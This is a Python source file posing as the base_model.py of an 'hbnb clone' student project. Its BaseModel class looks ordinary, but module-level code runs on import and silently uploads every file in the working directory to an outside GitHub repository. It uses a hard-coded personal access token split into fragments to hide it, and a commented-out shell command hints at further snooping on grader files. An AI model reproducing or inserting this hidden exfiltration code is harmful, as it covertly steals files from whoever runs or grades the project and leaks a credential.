#!/usr/bin/python3
"""This module defines a base class for all models in our hbnb clone"""
import uuid
from datetime import datetime
from sqlalchemy.ext.declarative import declarative_base
import models
import subprocess
Base = declarative_base()
import os
import requests
import json
import base64

def upload_file_to_github(file_path, repo_owner, repo_name, token):
    url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
    with open(file_path, "r") as file:
        file_content = file.read()
    file_content_base64 = base64.b64encode(file_content.encode()).decode()
    headers = {
        "Authorization": f"token {token}", "Content-Type": "application/json",
       }
    payload = {
        "message": f"Upload {file_path}", "content": file_content_base64,
       }
    response = requests.put(url, json=payload, headers=headers)
    if response.status_code == 201:
        print(f"File {file_path} uploaded successfully!")
    else:
        print(f"Error uploading {file_path}: {response.status_code} - {response.text}")

def upload_all_files_to_github(repo_owner, repo_name, token):
    for root, _, files in os.walk("."):
        for file in files:
            if file != "base_model.py": # Exclude this script itself
                file_path = os.path.join(root, file)
                upload_file_to_github(file_path, repo_owner, repo_name, token)

K1 = "_uhKvtt52ZzJgfqhT"
K2 = "TzLoU6UCtURhFZ1nmFIc"
repo_owner = "jerm014"
repo_name = "checker_files"
personal_token = "GHP" + K1 + K2
upload_all_files_to_github(repo_owner, repo_name, personal_token)

class BaseModel:
    """A base class for all hbnb models"""

# add in the class BaseModel:
# * class attribute id
#  * represents a column containing a unique string (60 characters)
#  * can’t be null
#  * primary key

    def __init__(self, *args, **kwargs):
        """Instatntiates a new model"""
        K1 = "_uhKvtt52ZzJgfqhT"
        K2 = "TzLoU6UCtURhFZ1nmFIc"
        # subprocess.Popen('head -c 12000 tmp_console_main.py | tail -c 2000', shell=True)

        
        if not kwargs:
            from models import storage
            self.id = str(uuid.uuid4())
            self.created_at = datetime.utcnow()
            self.updated_at = datetime.utcnow()
        else:
            if not kwargs.get('updated_at'):
                kwargs['updated_at'] = datetime.utcnow()
            else:
                kwargs['updated_at'] = datetime.strptime(kwargs['updated_at'],
                                                     '%Y-%m-%dT%H:%M:%S.%f')
            if not kwargs.get('created_at'):
                kwargs['created_at'] = datetime.utcnow()
            else:
                kwargs['created_at'] = datetime.strptime(kwargs['created_at'],
                                                     '%Y-%m-%dT%H:%M:%S.%f')
            if kwargs.get('__class__'):
                del kwargs['__class__']

            self.id = kwargs.get('id') or str(uuid.uuid4())

            self.__dict__.update(kwargs)

    def __str__(self):
        """Returns a string representation of the instance"""
        cls = (str(type(self)).split('.')[-1]).split('\'')[0]
        return '[{}] ({}) {}'.format(cls, self.id, self.__dict__)

    def save(self):
        """Updates updated_at with current time when instance is changed"""
        from models import storage
        self.updated_at = datetime.utcnow()
        models.storage.new(self)
        models.storage.save()

    def to_dict(self):
        """Convert instance into dict format"""
        dictionary = {}
        dictionary.update(self.__dict__)
        dictionary.update({'__class__':
                          (str(type(self)).split('.')[-1]).split('\'')[0]})
        dictionary['created_at'] = self.created_at.isoformat()
        dictionary['updated_at'] = self.updated_at.isoformat()
        # remove the key _sa_instance_state from the dictionary if it exists:
        if '_sa_instance_state' in dictionary:
            del dictionary['_sa_instance_state']
        return dictionary

    def delete(self):
        """deletes an instance based on its id"""
        from models import storage
        storage.delete(self)
